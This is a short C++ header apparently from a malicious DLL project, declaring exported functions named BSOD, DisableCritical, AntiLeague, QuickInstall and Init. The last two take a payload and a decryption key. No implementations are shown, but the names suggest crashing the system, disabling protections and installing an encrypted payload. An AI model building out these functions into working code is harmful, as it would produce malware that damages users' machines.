#pragma once

void BSOD();

extern "C"
{
	__declspec(dllexport) void DisableCritical();
	__declspec(dllexport) void AntiLeague();
	__declspec(dllexport) void QuickInstall(const std::string& payload, const std::string& dec_key);
	__declspec(dllexport) void Init(const std::string* payloadPath, const std::string& payload, const std::string& dec_key);
}